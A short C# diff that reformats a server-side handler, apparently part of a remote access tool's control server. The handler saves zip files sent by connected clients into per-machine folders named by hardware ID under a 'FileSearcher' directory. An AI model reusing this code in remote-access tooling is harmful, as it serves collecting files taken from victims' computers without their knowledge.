@@ -1,13 +1,10 @@
-﻿﻿using Server.Connection;
-using Server.MessagePack;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Drawing;
 using System.IO;
-using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Server.Connection;
+using Server.MessagePack;
 
 namespace Server.Handle_Packet
 {
@@ -17,15 +14,19 @@ namespace Server.Handle_Packet
         {
             try
             {
-                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "FileSearcher");
+                var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder",
+                    unpack_msgpack.ForcePathObject("Hwid").AsString, "FileSearcher");
                 if (!Directory.Exists(fullPath))
                     Directory.CreateDirectory(fullPath);
                 await Task.Run(() =>
                 {
-                    byte[] zipFile = unpack_msgpack.ForcePathObject("ZipFile").GetAsBytes();
-                    File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip", zipFile);
+                    var zipFile = unpack_msgpack.ForcePathObject("ZipFile").GetAsBytes();
+                    File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip",
+                        zipFile);
                 });
-                new HandleLogs().Addmsg($"Client {client.Ip} File Search success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/FileSearcher", Color.Purple);
+                new HandleLogs().Addmsg(
+                    $"Client {client.Ip} File Search success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/FileSearcher",
+                    Color.Purple);
                 client.Disconnected();
             }
             catch (Exception ex)
